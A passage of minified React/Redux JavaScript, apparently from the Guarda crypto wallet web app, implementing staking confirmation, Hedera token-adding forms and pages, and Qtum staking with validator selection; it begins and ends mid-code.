                })
            }
              , S = (0,
            O.useMemo)(( () => (0,
            Ko.gt)(s.amount, null == p ? void 0 : p.balance)), [null == p ? void 0 : p.balance, s.amount])
              , C = (0,
            O.useMemo)(( () => !(!u || !(0,
            Ko.G)((0,
            Ko.PD)(s.amount, u), null == p ? void 0 : p.balance))), [u, null == p ? void 0 : p.balance, s.amount])
              , N = (0,
            O.useMemo)(( () => b(s.amount, p)), [b, p, s.amount])
              , T = (0,
            O.useMemo)(( () => b(u, p)), [b, u, p])
              , A = (0,
            O.useMemo)(( () => {
                var e;
                return d ? (0,
                Ko.h9)(s.amount, u).toString() : null !== (e = s.amount) && void 0 !== e ? e : ""
            }
            ), [u, d, s.amount])
              , x = b(A, p, "usd")
              , handleConfirm = () => {
                var e;
                _(nb({
                    walletFrom: null !== (e = null == p ? void 0 : p.uuid) && void 0 !== e ? e : "",
                    params: {
                        amount: null != A ? A : "",
                        amountInUsd: null != x ? x : "",
                        fee: u,
                        gasPrice: c,
                        isFeeIncluded: d,
                        rounds: o,
                        addressFrom: null == p ? void 0 : p.address
                    }
                }))
            }
            ;
            if (!p)
                return null;
            const I = null == p ? void 0 : p.hw;
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, "Please check details and confirm")), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Stake ", (0,
            Ko.yF)(s.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), "?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will send", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(s.amount), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, fiat_estimate_FiatEstimate({
                value: N,
                renderCurrency: !0
            })))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "From Wallet", O.createElement(ConfirmInfoSubTitle, null, "Address")), O.createElement(ConfirmInfoValue, null, p.title, O.createElement(ConfirmInfoSubValue, null, p.address))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Network Fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, C && O.createElement("a", {
                href: "#",
                onClick: () => m(!d)
            }, d ? "Included" : "Excluded"), " ", !u || f ? "–" : d && !C ? O.createElement("span", {
                style: {
                    fontWeight: 100
                }
            }, "Included") : "", " ", u, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)), O.createElement(ConfirmInfoSubValue, null, fiat_estimate_FiatEstimate({
                value: T
            }), O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)((null == s ? void 0 : s.toConvert) || k))))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Deposit period"), O.createElement(ConfirmInfoValue, null, `${o} ${+o > 1 ? "rounds" : "round"} (${27 * +o} days)`)), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Will be deposited"), O.createElement(ConfirmInfoValue, null, (0,
            Ko.yF)(A), " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(p.currency)))), O.createElement("div", {
                className: dM
            }), S && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient ", (0,
            be.xG)(p.currency), " Balance. Available balance: ", p.balance, " ", (0,
            be.xG)(p.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: w(p.uuid)
            }, "Update wallet balance")), O.createElement(ledger_token_info, {
                parentWallet: p
            }), h && I && O.createElement(ui_message, null, "Please unlock you ", null == p ? void 0 : p.hw, ", choose ", (0,
            be.xG)(null == p ? void 0 : p.family), " app and then press Confirm."), v && O.createElement(bf, {
                error: v
            }), O.createElement("div", {
                className: fM
            }, h && O.createElement("div", {
                className: yM
            }, g && O.createElement("span", null, g)), !h && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !h && O.createElement("span", {
                onClick: handleBack
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: h,
                disabled: h,
                id: "cloConfirm"
            }, "Confirm")))), O.createElement("input", {
                id: "stakingAmountInUsd",
                type: "hidden",
                name: "amountInUsd",
                value: s.amountInUsd
            }))
        }
          , vZ = {
            wrapper: "hbar-add-token_wrapper_2-p8_ app_wrapperBlock_2EpA3",
            wrapperForm: "hbar-add-token_wrapperForm_10myF app_wrapperLeftBlock_3QLZp",
            footerBlock: "hbar-add-token_footerBlock_2yhVI app_footerBlock_n86Kc",
            stepInfo: "hbar-add-token_stepInfo_15lNY app_stepInfo_2VLE6",
            toggleAdvancedOptions: "hbar-add-token_toggleAdvancedOptions_2Phyo",
            formControl: "hbar-add-token_formControl_3pBAW",
            currencyFromWallet: "hbar-add-token_currencyFromWallet_35zbY",
            visible: "hbar-add-token_visible_1AhEP",
            misk: "hbar-add-token_misk_1dHYl",
            addLink: "hbar-add-token_addLink_1cYeI",
            close: "hbar-add-token_close_GJV-Q",
            inputCustomButtons: "hbar-add-token_inputCustomButtons_26kSs"
        };
        function form_add_token_hbar_extends() {
            form_add_token_hbar_extends = Object.assign ? Object.assign.bind() : function(e) {
                for (var t = 1; t < arguments.length; t++) {
                    var a = arguments[t];
                    for (var n in a)
                        Object.prototype.hasOwnProperty.call(a, n) && (e[n] = a[n])
                }
                return e
            }
            ;
            return form_add_token_hbar_extends.apply(this, arguments)
        }
        const _Z = O.forwardRef(( (e, t) => {
            const {index: a, control: n, token: r, wallet: l, onRemove: s} = e
              , i = (0,
            $.v9)(eu)(null == l ? void 0 : l.uuid)
              , [o,c] = (0,
            O.useState)(!1)
              , [u,d] = (0,
            O.useState)("")
              , m = `tokens.${a}.id`
              , onChangeTrimValue = e => t => {
                const a = "string" == typeof t ? t : t.target.value;
                return e((a || "").trim())
            }
              , p = (0,
            O.useCallback)((async e => {
                var t;
                if (!i || !("isTokenValid"in i))
                    return "unknown error";
                c(!0);
                const a = await i.isTokenValid(e)
                  , n = (null == a || null === (t = a.token) || void 0 === t ? void 0 : t.currency) || "";
                d(n);
                c(!1);
                return !!a.valid || (a.error || "unknown error")
            }
            ), [i]);
            (0,
            O.useEffect)(( () => {
                r.id && p(r.id)
            }
            ), [r.id, p]);
            return O.createElement("div", {
                ref: t,
                className: vZ.formControl,
                key: r.uuid
            }, O.createElement(label, null, "Token Id"), O.createElement("div", {
                className: "relative"
            }, O.createElement(C$.Qr, {
                name: m,
                rules: {
                    required: "Enter token Id",
                    validate: p
                },
                defaultValue: r.id,
                control: n,
                render: e => {
                    let {field: t, fieldState: {invalid: a, error: n}} = e;
                    return O.createElement(pa, {
                        isInvalid: a,
                        message: null == n ? void 0 : n.message
                    }, s && O.createElement("small", {
                        className: vZ.close,
                        onClick: s
                    }), O.createElement(Ea, form_add_token_hbar_extends({}, t, {
                        onChange: onChangeTrimValue(t.onChange),
                        value: t.value || "",
                        placeholder: "Token Id"
                    })), t.value ? O.createElement("div", {
                        className: vZ.currencyFromWallet,
                        title: u
                    }, o ? O.createElement(LoaderDots, {
                        visible: o
                    }) : u) : O.createElement(qr_scanner_paste_button, {
                        className: s ? vZ.inputCustomButtons : void 0,
                        setAddress: onChangeTrimValue(t.onChange)
                    }))
                }
            })))
        }
        ))
          , FormAddTokenHbar = e => {
            var t, a;
            const n = (0,
            j.k6)()
              , {tokenIds: r} = useLocationSearch()
              , l = (0,
            O.useMemo)(( () => {
                if (!r)
                    return [{}];
                const e = undefined;
                return ("string" == typeof r ? [r] : Object.values(r || {})).map((e => ({
                    id: e
                })))
            }
            ), [r])
              , {wallets: s, fromWallet: i, fee: o, isLoading: c} = e
              , u = {
                fromWallet: i,
                fee: o,
                tokens: l
            }
              , d = (0,
            C$.cI)({
                defaultValues: u,
                mode: "onChange",
                reValidateMode: "onChange"
            })
              , {reset: m, getValues: p, formState: {errors: f, isValidating: E, isSubmitting: h}, handleSubmit: g, control: y, watch: v} = d
              , {fields: _, append: w, remove: b} = (0,
            C$.Dq)({
                control: y,
                name: "tokens",
                keyName: "uuid"
            })
              , k = v("fromWallet")
              , S = null == k ? void 0 : k.balance
              , C = (0,
            O.useMemo)(( () => (0,
            Ko.gt)(o, S)), [S, o])
              , N = (0,
            O.useCallback)((e => () => {
                const t = {
                    ...p()
                };
                b(e);
                t.tokens.splice(e, 1);
                m(t)
            }
            ), [p, b, m])
              , T = (0,
            O.useCallback)((e => {
                if (c || E || h || C)
                    return;
                const t = {
                    fee: o,
                    walletFrom: e.fromWallet.uuid,
                    tokenIds: e.tokens.reduce(( (e, t, a, n) => {
                        const {id: r} = t
                          , l = undefined;
                        return n.findIndex((e => e.id === r)) === a ? e.concat([r]) : e
                    }
                    ), [])
                };
                n.push({
                    pathname: (0,
                    M.RU)("/add-token-hbar/confirm"),
                    search: objectToString(t)
                })
            }
            ), [o, n, C, c, h, E])
              , A = !1
              , x = (null == _ ? void 0 : _.length) > 1;
            return O.createElement("form", {
                onSubmit: g(T),
                style: {
                    minHeight: "400px"
                }
            }, O.createElement(label, null, "Wallet"), O.createElement(pa, {
                isSelect: !0,
                isInvalid: !!f.fromWallet,
                message: null !== (t = f.fromWallet) && void 0 !== t && t.balance ? null === (a = f.fromWallet) || void 0 === a ? void 0 : a.balance.message : ""
            }, O.createElement(C$.Qr, {
                name: "fromWallet",
                control: y,
                render: e => {
                    let {field: t} = e;
                    return O.createElement(Mh, form_add_token_hbar_extends({
                        wallets: s,
                        selectedWallet: t.value,
                        withoutWatchOnly: !0,
                        withoutSubwallets: !0,
                        customFilter: e => onCustomFilterWallets(e, ["hbar"]),
                        emptyPlaceholder: "You can select only HBAR here"
                    }, t))
                }
            })), O.createElement("div", null, _.map(( (e, t) => O.createElement(_Z, {
                key: e.uuid,
                index: t,
                control: y,
                token: e,
                wallet: k,
                errors: f,
                onRemove: x ? N(t) : void 0
            })))), A, O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Available: "), O.createElement(MiskInfoValue, null, (0,
            Ko.yF)(S || 0), " ", (0,
            be.xG)(k && (null == k ? void 0 : k.currency)))), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Max network fee:"), O.createElement(MiskInfoValue, {
                disabled: c || !o
            }, (0,
            Ko.yF)(o || 0), " ", (0,
            be.xG)(k && (null == k ? void 0 : k.currency)))), C && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient", " ", (0,
            be.xG)(null == k ? void 0 : k.currency), " ", "Balance. Available balance:", " ", S, " ", (0,
            be.xG)(null == k ? void 0 : k.currency)), O.createElement("div", {
                className: vZ.footerBlock
            }, c ? O.createElement("div", {
                className: vZ.stepInfo
            }, process && O.createElement("span", null, process)) : O.createElement("div", {
                className: vZ.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                type: "submit",
                isLoading: c || E || h
            }, "Next")))
        }
          , wZ = O.memo(( () => O.createElement(O.Fragment, null, O.createElement(panel_right_image, {
            src: mD
        }, "To receive Hedera tokens, ", O.createElement("a", {
            href: "https://support.guarda.com/assets/how-to-add-hbar-tokens",
            rel: "noopener noreferrer",
            target: "_blank"
        }, "you need to add them first"), ". A network fee will be charged for this transaction."), O.createElement(ui_message, {
            type: "info"
        }, "You will still be charged a network fee for adding deleted tokens. Be careful and check the status of the token before adding it."))))
          , bZ = O.memo(( () => {
            const e = useLocationSearch()
              , [t,a] = (0,
            O.useState)(null == e ? void 0 : e.walletFrom)
              , [n,r] = (0,
            O.useState)("")
              , l = (0,
            $.v9)($c)
              , isHbarWallet = e => {
                let {currency: t} = e;
                return ["hbar", "hbar-testnet"].includes(t)
            }
              , s = (0,
            O.useMemo)(( () => {
                const e = undefined;
                return l.filter(isHbarWallet).map((e => e.data))
            }
            ), [l])
              , i = (0,
            O.useMemo)(( () => s.find((e => {
                let {uuid: a} = e;
                return t === a
            }
            ))), [t, s]);
            (0,
            O.useEffect)(( () => {
                let e = !1;
                (async () => {
                    const {associateTokenFee: t} = await Se.Z.getApiByCurrency("hbar");
                    e || r(t)
                }
                )();
                return () => {
                    e = !0
                }
            }
            ), []);
            (0,
            O.useEffect)(( () => {
                t !== (null == e ? void 0 : e.walletFrom) && a(null == e ? void 0 : e.walletFrom)
            }
            ), [null == e ? void 0 : e.walletFrom]);
            return s.length && i ? O.createElement(sG, {
                wallet: i,
                RightBlockContent: wZ,
                styles: vZ
            }, O.createElement(FormAddTokenHbar, {
                wallets: s,
                fromWallet: i,
                fee: n,
                isLoading: !1
            })) : null
        }
        ))
          , kZ = O.forwardRef(( (e, t) => {
            let {fee: a, fromWallet: n} = e;
            const {convertToFiat: r} = useConverter()
              , l = (0,
            O.useMemo)(( () => r(a, n)), [r, a, n]);
            return O.createElement("span", {
                ref: t
            }, fiat_estimate_FiatEstimate({
                value: l
            }))
        }
        ))
          , PageConfirmAddTokenHbar = () => {
            const e = (0,
            j.TH)()
              , t = (0,
            j.k6)()
              , a = (0,
            $.I0)()
              , {fee: n, tokenIds: r, walletFrom: l, toConvert: s} = useLocationSearch()
              , [i,o] = (0,
            O.useState)([])
              , c = (0,
            $.v9)(eu)(l)
              , u = (0,
            O.useCallback)((e => () => a(Iw({
                uuid: e
            }))), [a])
              , d = (0,
            O.useMemo)(( () => (0,
            Ko.gt)(n, null == c ? void 0 : c.balance)), [null == c ? void 0 : c.balance, n])
              , m = (0,
            O.useMemo)(( () => r ? "string" == typeof r ? [r] : "object" != typeof r || Array.isArray(r) ? r : Object.values(r) : []), [r])
              , {localCurrency: p} = local_currency_useLocalCurrency()
              , [f,E] = (0,
            O.useState)(!1)
              , [h,g] = (0,
            O.useState)("")
              , [y,v] = (0,
            O.useState)(null)
              , handleConfirm = async () => {
                if (m.length && c && !d) {
                    v(null);
                    E(!0);
                    try {
                        if (!("fetchAndAddTokenSubwallet"in c))
                            return;
                        g("Preparing transaction...");
                        const e = await c.fetchAndAddTokenSubwallet(m);
                        if (null != e && e.hash && null != e && e.tokens.length) {
                            null == e || e.tokens.forEach((e => a(addSubWallet(c, e))));
                            t.replace({
                                pathname: (0,
                                M.RU)("/add-token-hbar/success"),
                                search: objectToString({
                                    hash: null == e ? void 0 : e.hash,
                                    walletFrom: null == c ? void 0 : c.uuid,
                                    currency: null == c ? void 0 : c.currency,
                                    tokenIds: m
                                })
                            })
                        }
                    } catch (e) {
                        null != e && e.errorCode ? v({
                            code: e.errorCode,
                            cause: null == e ? void 0 : e.cause,
                            message: null == e ? void 0 : e.message
                        }) : v(e.message);
                        console.log(e)
                    }
                    E(!1)
                }
            }
            ;
            (0,
            O.useEffect)(( () => {
                m.length && c && "fetchTokenInfo"in c && c.fetchTokenInfo(m).then((e => {
                    null != e && e.size && o(Array.from(e.values() || []))
                }
                ))
            }
            ), [c, m]);
            const _ = (0,
            O.useCallback)(( () => {
                t.replace({
                    pathname: (0,
                    M.RU)("/add-token-hbar"),
                    search: e.search
                })
            }
            ), [t, e.search]);
            return O.createElement("div", {
                className: sM
            }, O.createElement(DashboardMenu, null), O.createElement(XO, null, O.createElement(panel_right_image, {
                src: rM
            }, O.createElement("p", null, "Please check details and confirm"), O.createElement(ui_message, {
                type: "info"
            }, "You will still be charged a network fee for adding deleted tokens. Be careful and check the status of the token before adding it."))), O.createElement("div", {
                className: iM
            }, O.createElement("div", {
                className: uM
            }, O.createElement("h3", null, "Are you sure you want to"), O.createElement("h2", null, "Add Hedera token?")), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "You will add", O.createElement(ConfirmInfoSubTitle, null, "Token Id")), O.createElement(ConfirmInfoValue, null, O.createElement("div", {
                className: kM
            }, null != i && i.length ? i.map((e => {
                let {title: t, smartContract: a} = e;
                return O.createElement("div", {
                    key: a,
                    className: SM
                }, t, O.createElement(ConfirmInfoSubValue, null, a))
            }
            )) : O.createElement(LoaderDots, {
                visible: !0
            })))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "To wallet", O.createElement(ConfirmInfoSubTitle, null, "Address")), O.createElement(ConfirmInfoValue, null, null == c ? void 0 : c.title, O.createElement(ConfirmInfoSubValue, null, null == c ? void 0 : c.address))), O.createElement(Eg, null, O.createElement(ConfirmInfoTitle, null, "Max network fee", O.createElement(ConfirmInfoSubTitle, null, "Equivalent")), O.createElement(ConfirmInfoValue, null, n, " ", (0,
            be.xG)(null == c ? void 0 : c.currency), O.createElement(ConfirmInfoSubValue, null, c && n ? O.createElement(kZ, {
                fromWallet: c,
                fee: n
            }) : "", " ", (0,
            be.xG)(s || p)))), O.createElement("div", {
                className: dM
            }), d && O.createElement(ui_message, {
                type: "error"
            }, "Insufficient", " ", (0,
            be.xG)(null == c ? void 0 : c.currency), " ", "Balance. Available balance:", " ", null == c ? void 0 : c.balance, " ", (0,
            be.xG)(null == c ? void 0 : c.currency), O.createElement("br", null), O.createElement("a", {
                className: vM,
                onClick: u(null == c ? void 0 : c.uuid)
            }, "Update wallet balance")), y && O.createElement(bf, {
                error: y
            }), O.createElement("div", {
                className: fM
            }, f && O.createElement("div", {
                className: yM
            }, h && O.createElement("span", null, h)), !f && O.createElement("div", {
                className: EM
            }, "Step 2 of 3"), O.createElement("div", {
                className: hM
            }, !f && O.createElement("span", {
                onClick: _
            }, "Back"), O.createElement(Yl, {
                color: "blue",
                size: "big",
                onClick: handleConfirm,
                isLoading: f,
                disabled: f,
                id: "confirm"
            }, "Confirm")))))
        }
          , page_success_add_token_hbar_getHrefRateGuarda = () => {
            const e = undefined
              , t = undefined;
            return ["https://www.cryptocompare.com/wallets/guarda-wallet/", "https://www.trustpilot.com/evaluate/guarda.co?"][1 === random(1, 5) ? 0 : 1]
        }
          , PageSuccessAddTokenHbar = () => {
            var e, t;
            const {walletFrom: a, tokenIds: n, hash: r} = useLocationSearch()
              , l = (0,
            $.v9)(eu)(a)
              , [s,i] = (0,
            O.useState)([])
              , o = (0,
            O.useMemo)(( () => n ? "string" == typeof n ? [n] : "object" != typeof n || Array.isArray(n) ? n : Object.values(n) : []), [n])
              , [c,u] = (0,
            O.useState)(0)
              , mouseEnter = e => {
                var t;
                let {currentTarget: a} = e;
                const n = null == a || null === (t = a.dataset) || void 0 === t ? void 0 : t.number;
                n && u(+n)
            }
              , mouseLeave = () => {
                u(0)
            }
              , mouseClick = e => {
                var t;
                let {currentTarget: a} = e;
                const n = null == a || null === (t = a.dataset) || void 0 === t ? void 0 : t.number;
                n && cc.$.send(cc.d.TRUSTPILOT_RAITING, n)
            }
              , getLink = e => {
                var t, a;
                if (!l)
                    return "";
                const n = null !== (t = null == l ? void 0 : l.data) && void 0 !== t ? t : l;
                return e ? (0,
                be.Kb)(null !== (a = n.family) && void 0 !== a ? a : null == n ? void 0 : n.currency, n.currency, e) : ""
            }
            ;
            (0,
            O.useEffect)(( () => {
                let e = !1;
                o.length && l && "fetchTokenInfo"in l && (async () => {
                    const t = await l.fetchTokenInfo(o);
                    e || null != t && t.size && i(Array.from(t.values()))
                }
                )();
                return () => {
                    e = !0
                }
            }
            ), [o, l]);
            return O.createElement("div", {
                className: UM
            }, O.createElement(DashboardMenu, null), O.createElement("div", {
                className: GM
            }, O.createElement("div", {
                className: $M
            }, O.createElement("img", {
                src: LM,
                alt: ""
            }), O.createElement("h2", null, "Success!"), O.createElement("h3", {
                style: {
                    margin: "8px 0 20px"
                }
            }, "Token will be added after the transaction is confirmed"), O.createElement("div", {
                className: Ht()(ZM, XM, QM)
            }, null != s && s.length ? O.createElement("div", {
                className: JM
            }, O.createElement("div", {
                className: Ht()(yU, _U)
            }, null === (e = s[0]) || void 0 === e ? void 0 : e.currency), O.createElement("span", {
                className: yU
            }, null === (t = s[0]) || void 0 === t ? void 0 : t.smartContract)) : O.createElement(LoaderDots, {
                visible: !0
            })), O.createElement("div", {
                className: ZM
            }, "Hash: ", O.createElement("div", null, O.createElement("span", {
                className: qM
            }, formatAddress(r, 10))), O.createElement("div", {
                className: eU
            }, O.createElement(button_copy, {
                text: getLink(r),
                className: aU
            }, (e => e ? O.createElement("img", {
                src: uf,
                alt: "",
                width: "20px",
                height: "20px"
            }) : O.createElement("img", {
                src: FM,
                width: "20px",
                height: "20px",
                alt: ""
            }))), O.createElement("a", {
                className: tU,
                href: getLink(r),
                target: "_blank",
                rel: "noreferrer noopener"
            }, O.createElement("img", {
                src: Pg,
                alt: "",
                width: "17px",
                height: "17px"
            })))), O.createElement("p", {
                className: oU
            }, "Would you like to rate us?"), O.createElement("a", {
                href: page_success_add_token_hbar_getHrefRateGuarda(),
                target: "_blank",
                rel: "noopener noreferrer"
            }, Array.from({
                length: 5
            }).map(( (e, t) => c > t ? O.createElement("img", {
                key: `star${t + 1}`,
                "data-number": t + 1,
                className: iU,
                src: RM,
                alt: "",
                onMouseEnter: mouseEnter,
                onMouseLeave: mouseLeave,
                onClick: mouseClick
            }) : O.createElement("img", {
                key: `star${t + 1}`,
                "data-number": t + 1,
                className: iU,
                src: WM,
                alt: "",
                onMouseEnter: mouseEnter,
                onMouseLeave: mouseLeave,
                onClick: mouseClick
            })))))))
        }
          , SZ = {
            wrapper: "index_wrapper_1-G82 app_wrapperBlock_2EpA3",
            wrapperForm: "index_wrapperForm_29O1s app_wrapperLeftBlock_3QLZp",
            footerBlock: "index_footerBlock_2QEPB app_footerBlock_n86Kc",
            stepInfo: "index_stepInfo_1b7Lw app_stepInfo_2VLE6",
            toggleAdvancedOptions: "index_toggleAdvancedOptions_2SvTn"
        }
          , CZ = (0,
        te.createAction)("@qtum/validators/SET_VALIDATORS")()
          , NZ = "@qtum/validators"
          , TZ = {
            validators: []
        }
          , AZ = (0,
        te.createReducer)(TZ).handleAction(CZ, ( (e, t) => {
            let {payload: {validators: a}} = t;
            return {
                ...e,
                validators: a
            }
        }
        )).handleAction(ne, (e => ({
            ...e,
            validators: []
        })))
          , validators_qtum_selectedValidators = e => e["@qtum/validators"].validators || []
          , validators_qtum_fetchValidators = () => async (e, t) => {
            const a = t();
            if (validators_qtum_selectedValidators(a).length)
                return;
            const n = await Se.Z.getApiByCurrency("qtum");
            if (!n)
                return;
            const r = await n.fetchValidators();
            e(CZ({
                validators: r
            }))
        }
          , use_qtum_validators_startFetchValidators = async e => {
            let {setLoading: t, dispatch: a} = e;
            t(!0);
            await a(validators_qtum_fetchValidators());
            t(!1)
        }
          , xZ = "QZun3yDcB9vBetui2QvcekkmJPzonpjzV9"
          , useQtumValidators = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            $.v9)(validators_qtum_selectedValidators)
              , a = (0,
            $.v9)(Bo)
              , [n,r] = (0,
            O.useState)(!1)
              , l = (0,
            O.useMemo)(( () => {
                const e = t.find((e => e.address === xZ));
                return e || (t.length > 0 ? t[0] : void 0)
            }
            ), [t]);
            (0,
            O.useEffect)(( () => {
                !0 !== a && (t.length || use_qtum_validators_startFetchValidators({
                    setLoading: r,
                    dispatch: e
                }))
            }
            ), [e, t.length, a]);
            return {
                listOfValidators: t,
                defaultValidator: l,
                isLoading: n
            }
        }
          , IZ = useQtumValidators
          , StakingQtumIndex = () => {
            const e = (0,
            $.I0)()
              , t = O.createRef()
              , a = (0,
            j.k6)()
              , {convertToFiat: n} = useConverter()
              , r = (0,
            $.v9)($c)
              , [l,s] = (0,
            O.useState)(!1)
              , [i,o] = (0,
            O.useState)(!1)
              , [c,u] = (0,
            O.useState)(void 0)
              , {listOfValidators: d, defaultValidator: m, isLoading: p} = IZ()
              , {fromWallet: f, setFromWallet: E, amount: h, setAmount: g} = oG({
                ticker: "qtum"
            })
              , y = [...r].filter((e => "qtum" === e.currency))
              , v = 18
              , _ = (0,
            Ko.FH)(f ? f.balance : "0", {
                roundDown: !0,
                max: v
            })
              , [w] = (0,
            O.useState)({
                address: (null == c ? void 0 : c.address) || "",
                currency: "qtum",
                uuid: ""
            })
              , [b,,k,,] = use_fee(f, w, null == f ? void 0 : f.balance, {
                totalBalance: f ? null == f ? void 0 : f.balance : void 0
            });
            (0,
            O.useEffect)(( () => {
                if (!c && m) {
                    o(!1);
                    u(m)
                }
            }
            ), [m, c]);
            (0,
            O.useEffect)(( () => {
                u(m)
            }
            ), [m, null == f ? void 0 : f.uuid]);
            const handleChangeFromWallet = t => {
                e(updateWalletsBalanceAndTxs(t, {
                    isCascade: !0
                }));
                E(t)
            }
              , handleSetVisibleOptions = () => {
                o(!i)
            }
            ;
            function handleSetValidator(e) {
                u(e)
            }
            (0,
            O.useEffect)(( () => {
                l && s(!1)
            }
            ), [f]);
            const handleNext = () => {
                var e, r;
                const {isValid: l} = null !== (e = null === (r = t.current) || void 0 === r ? void 0 : r.validate()) && void 0 !== e ? e : {};
                if (!l) {
                    s(!0);
                    return
                }
                const i = {
                    validatorTitle: (null == c ? void 0 : c.title) || "",
                    validatorFee: String(null == c ? void 0 : c.fee) || "",
                    validatorAddress: (null == c ? void 0 : c.address) || "",
                    walletFrom: (null == f ? void 0 : f.uuid) || "",
                    amount: (null == f ? void 0 : f.balance) || ""
                }
                  , o = (0,
                Ko.FH)(n(h, f, "usd"), {
                    max: 4
                });
                o && Object.assign(i, {
                    amountInUsd: o
                });
                const u = new URLSearchParams(i);
                a.push({
                    pathname: (0,
                    M.RU)("/staking-qtum/staking/confirm"),
                    search: u.toString()
                })
            }
              , S = {
                precision: v,
                min: "0",
                max: _,
                available: _
            }
              , C = O.memo(( () => O.createElement(panel_right_image, {
                src: mD
            }, "You can only stake the whole balance to one Validator. QTUM blockchain freezes your balance for about 18 hours after you stake. All incoming QTUM will be automatically delegated to the current Validator.")));
            return f ? O.createElement(sG, {
                wallet: f,
                styles: SZ,
                RightBlockContent: C
            }, O.createElement(sf(), {
                ref: t
            }, O.createElement(label, null, "From"), O.createElement(lf.ValidatorField, {
                rules: zf.wallet,
                value: f
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && l,
                    message: a
                }, O.createElement(Mh, {
                    selectedWallet: f,
                    wallets: y,
                    onChange: handleChangeFromWallet,
                    withoutWatchOnly: !0,
                    customFilter: e => onCustomFilterWallets(e, ["qtum"]),
                    stakingCurrency: "QTUM"
                }))
            }
            )), O.createElement(label, null, "Deposit Amount"), O.createElement("div", {
                className: "relative"
            }, O.createElement(lf.ValidatorField, {
                value: null == f ? void 0 : f.balance,
                rules: zf.amount(S)
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isInvalid: !t && l,
                    message: a
                }, O.createElement(Ea, {
                    autoFocus: !0,
                    name: "lastpass-fix-search",
                    disabled: !0,
                    onChange: () => {}
                    ,
                    value: (null == f ? void 0 : f.balance) || "",
                    placeholder: "0"
                }))
            }
            ))), O.createElement(AvailableForStaking, {
                currency: f.currency,
                maxAmount: _,
                setAmount: g
            }), O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Network Fee:"), O.createElement(MiskInfoValue, null, !b || k ? "–" : O.createElement("span", null, Number(b) + 1, " ", O.createElement("span", {
                className: "nowrap"
            }, (0,
            be.xG)(null == f ? void 0 : f.currency))))), c && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, null == c ? void 0 : c.title, " (", null == c ? void 0 : c.subtitle, ")")), !c && O.createElement(misk_info, null, O.createElement(MiskInfoTitle, null, "Validator:"), O.createElement(MiskInfoValue, null, O.createElement(LoaderDots, {
                visible: !0
            }))), !i && O.createElement("div", {
                className: SZ.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Advanced options")), i && O.createElement(O.Fragment, null, O.createElement("div", {
                className: SZ.toggleAdvancedOptions
            }, O.createElement("span", {
                onClick: handleSetVisibleOptions,
                className: "dashedNormal"
            }, "Hide advanced options")), O.createElement(label, null, "To"), O.createElement(lf.ValidatorField, {
                rules: zf.qtumValidator,
                value: c
            }, (e => {
                let {isValid: t, message: a} = e;
                return O.createElement(pa, {
                    isSelect: !0,
                    isInvalid: !t && l,
                    message: a
                }, O.createElement(Lp, {
                    selected: c,
                    isLoading: p,
                    items: d,
                    placeholder: "Select Validator",
                    emptyPlaceholder: "Validators not found",
                    onChange: handleSetValidator
                }))
            }
            )), O.createElement(ui_message, {
                type: "warning"
            }, "We cannot guarantee the stability of a third-party validator. Please do your own research to assess risks.")), O.createElement("div", {
                className: SZ.footerBlock
            }, O.createElement("div", {
                className: SZ.stepInfo
            }, "Step 1 of 3"), O.createElement(Yl, {
                onClick: handleNext,
                color: "blue",
                size: "big"
            }, "Next")))) : null
        }
        ;
        let PZ = !1;
        const StakingQtumConfirm_setProcess = async e => {
            let {processText: t, setSyncProcess: a} = e;
            a(t);
            return new Promise((e => setTimeout(e, 200)))
        }
          , StakingQtumConfirm = () => {
            const e = (0,
            $.I0)()
              , t = (0,
            j.k6)()
              , a = (0,
            j.TH)()
              , n = useLocationSearch()
              , r = (0,
            $.v9)($c)
              , l = (0,
            $.v9)(eu)
              , [s,i] = (0,
            O.useState)(!1)
              , [o,c] = (0,
            O.useState)("")
              , [u,d] = (0,
            O.useState)("")
              , [m,p] = (0,
            O.useState)()
              , [f] = (0,
            O.useState)({
                address: n.validatorAddress || "",
                currency: "qtum",
                uuid: ""
            })
              , {convertToFiat: E} = useConverter()
              , {localCurrency: h} = local_currency_useLocalCurrency()
              , [g] = fee_wallet(m)
              , [y,v,_,w] = use_fee(m, f, n.amount, {
                totalBalance: m ? null == m ? void 0 : m.balance : void 0
            });
            (0,
            O.useEffect)(( () => {
